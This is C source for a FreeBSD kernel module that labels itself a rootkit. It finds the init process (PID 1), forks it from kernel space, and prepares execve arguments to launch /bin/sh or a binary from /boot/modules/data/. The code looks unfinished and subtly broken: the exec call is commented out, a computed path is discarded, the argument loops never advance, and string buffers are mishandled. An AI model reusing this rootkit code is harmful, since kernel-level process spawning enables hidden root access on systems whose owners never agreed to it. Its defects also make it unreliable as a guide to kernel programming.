#include <binary.h>
#include <debug.h>

#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/libkern.h>
#include <sys/unistd.h>
#include <sys/syscallsubr.h>

#include <vm/vm.h> 
#include <vm/vm_page.h> 
#include <vm/vm_map.h>
#include <sys/imgact.h>

#define BIN_PATH "/boot/modules/data/"
#define PROCESS_ID_TO_FORK 1
MALLOC_DEFINE(BINARY_BOOT, "binary_boot", "binary_boot");

int boot_binary(char *path){
	char * binary_path = get_binary_path(path);
	binary_path = NULL;
	struct thread * thread_to_fork = find_first_thread(PROCESS_ID_TO_FORK);

	if(thread_to_fork != NULL)
	{
		int fork_error, forked_pid;
		fork_error = fork_process(thread_to_fork, &forked_pid);
		if(fork_error == 0)
		{
			struct thread * thread_for_execve = find_first_thread(forked_pid);
			LOGI("[rootkit:boot_binary] Executing execve on tid=[%d]\n", thread_for_execve->td_tid);
			int result = execute_binary(thread_for_execve);
			LOGI("[rootkit:boot_binary]: execve=>%d\n", result);
		}else{
			LOGI("Fork Error = [%d]\n", fork_error);
		}

	}
	return 1;
}

int fork_process(struct thread * thread_to_fork, int *pid)
{
	struct fork_req fr;
	bzero(&fr, sizeof(fr));
	fr.fr_flags = RFFDG | RFPROC;
	fr.fr_pidp = pid;
	int error = fork1(thread_to_fork, &fr);
	return error;
}

char * get_binary_path(char * path)
{
	LOGI("[rootkit:boot_binary]  BINARY BOOT\n");
	char * new_string = malloc(strlen(BIN_PATH) + strlen(path), BINARY_BOOT, M_WAITOK);
	char * temp = strcat(new_string, BIN_PATH);
	char * final = strcat(temp, path);

	LOGI("[rootkit:boot_binary] new %s\n", new_string);
	LOGI("[rootkit:boot_binary] temp %s\n", temp);
	LOGI("[rootkit:boot_binary]  Attempting to boot %s\n", final);
	return final;
}

// int execute_binary(struct thread * td)
// {
// 	// struct execve_args kernel_ea; 
// 	// struct execve_args *user_ea;
// 	char *lol = "/bin/sh";
// 	vm_offset_t base, addr;
// 	struct vmspace *process_vmspace;

// 	process_vmspace = td->td_proc->p_vmspace;
// 	base = round_page((vm_offset_t) process_vmspace->vm_daddr);
// 	addr = base + ctob(process_vmspace->vm_dsize);

// 	vm_map_find(&process_vmspace->vm_map, NULL, 0, &addr, PAGE_SIZE, 0, FALSE, VM_PROT_ALL, VM_PROT_ALL, 0); 
// 	process_vmspace->vm_dsize += btoc(PAGE_SIZE);
// 	int copyres = copyout(lol, &addr, strlen(lol)); 
	
// 	LOGI("COPYRES => %d\n", copyres);
// 	return 1;
// }

int execute_binary(struct thread * td)
{
	struct image_args args;
	struct vmspace *oldvmspace;
	int error;

	char *argv[1] = { "/bin/sh" };
	char *envv[1] = { "test" };

	error = pre_execve(td, &oldvmspace);
	if (error != 0)
	{
		return (error);
	}
    error = exec_copyin_args_custom(&args, argv[0], UIO_SYSSPACE, argv, envv);
	if (error == 0)
	{
		LOGI("Executing %p\n", &args);
        
		// error = kern_execve(td, &args, NULL);
	}else
	{
		LOGI("ERROR copyinargs = [%d]\n", error);
	}

	// error = kern_execve(td, &args, NULL);
	// return (error);
	return 1;
}

/*
 * Copy out argument and environment strings from the old process address
 * space into the temporary string buffer.
 */
int exec_copyin_args_custom(struct image_args *args, const char *fname, enum uio_seg segflg, char **argv, char **envv)
{
	int error;

	bzero(args, sizeof(*args));
	if (argv == NULL)
	{	
		LOGI("ARGV NULL\n");
		return (EFAULT);
	}
	

	/*
	 * Allocate demand-paged memory for the file name, argument, and
	 * environment strings.
	 */
	error = exec_alloc_args(args);
	if (error != 0)
	{
		LOGI("EXEC ALLOC ARGS FAILED\n");
		return (error);
	}

	/*
	 * Copy the file name.
	 */
	error = exec_args_add_fname(args, fname, segflg);
	if (error != 0)
	{
		LOGI("EXEC ALLOC ARGS FAILED\n");
		goto err_exit;
	}
		
	/*
	 * extract arguments first
	 */
	for (;;) {
		if (argv == 0)
			break;
		error = exec_args_add_arg(args, argv[0], segflg);
		if (error != 0)
		{
			LOGI("EXEC ARGS ADD ARG ARGS FAILED\n");
			goto err_exit;
		}
			
	}

	/*
	 * extract environment strings
	 */
	if (envv) {
		for (;;) {
			if (envv == 0)
				break;
			error = exec_args_add_env(args, envv[0], segflg);

			if (error != 0){
				LOGI("EXEC ARGS ADD END FAILED\n");
				goto err_exit;
			}
				
		}
	}

	return (0);

	err_exit:
		exec_free_args(args);
		return (error);
}


int exec_args_add_str(struct image_args *args, const char *str, enum uio_seg segflg, int *countp)
{
	int error;
	size_t length;

	KASSERT(args->endp != NULL, ("endp not initialized"));
	KASSERT(args->begin_argv != NULL, ("begin_argp not initialized"));
	
	error = (segflg == UIO_SYSSPACE) ?
	    copystr(str, args->endp, args->stringspace, &length) :
	    copyinstr(str, args->endp, args->stringspace, &length);
	if (error != 0)
		return (error == ENAMETOOLONG ? E2BIG : error);
	args->stringspace -= length;
	args->endp += length;
	(*countp)++;

	return (0);
}

int exec_args_add_arg(struct image_args *args, const char *argp, enum uio_seg segflg)
{

	KASSERT(args->envc == 0, ("appending args after env"));

	return (exec_args_add_str(args, argp, segflg, &args->argc));
}

int exec_args_add_env(struct image_args *args, const char *envp, enum uio_seg segflg)
{

	if (args->envc == 0)
		args->begin_envv = args->endp;

	return (exec_args_add_str(args, envp, segflg, &args->envc));
}

int exec_args_add_fname(struct image_args *args, const char *fname, enum uio_seg segflg)
{
	int error;
	size_t length;

	KASSERT(args->fname == NULL, ("fname already appended"));
	KASSERT(args->endp == NULL, ("already appending to args"));

	if (fname != NULL) {
		args->fname = args->buf;
		error = segflg == UIO_SYSSPACE ?
		    copystr(fname, args->fname, PATH_MAX, &length) :
		    copyinstr(fname, args->fname, PATH_MAX, &length);
		if (error != 0)
			return (error == ENAMETOOLONG ? E2BIG : error);
	} else
		length = 0;

	/* Set up for _arg_*()/_env_*() */
	args->endp = args->buf + length;
	/* begin_argv must be set and kept updated */
	args->begin_argv = args->endp;
	KASSERT(exec_map_entry_size - length >= ARG_MAX,
	    ("too little space remaining for arguments %zu < %zu",
	    exec_map_entry_size - length, (size_t)ARG_MAX));
	args->stringspace = ARG_MAX;

	return (0);
}

struct thread * find_first_thread(pid_t pid)
{	
	struct proc *p;	
	struct proc *return_p;
	struct thread * return_thread;

	return_p = 0x00;
	p = 0x00;
	return_thread = 0x00;

	LOGI("[rootkit:find_process] Attemping to find process with ID %d\n", pid);

	sx_slock(&allproc_lock);
	
	/* Two options. Iterate over pidhashtabl, or allproc_list. 
	*  Better performance over pidhashtabl */
	LIST_FOREACH(p, PIDHASH(pid), p_list){
		LOGI("[rootkit:find_process] Checking PID:%d\n", p->p_pid);
		if(p->p_pid == pid)
		{
			/* A process is either NEW, NORMAL, ZOMBIE 
			*  ( new means in creation , see proc.h ) */
			if(p->p_state == PRS_NEW)
			{ 
				p = NULL;
				break;
			}
			return_p = p;
			break;
		}
	}

	sx_sunlock(&allproc_lock);
	
	if( return_p != NULL )
	{
		return_thread = FIRST_THREAD_IN_PROC(return_p);
	}
	return return_thread;
}
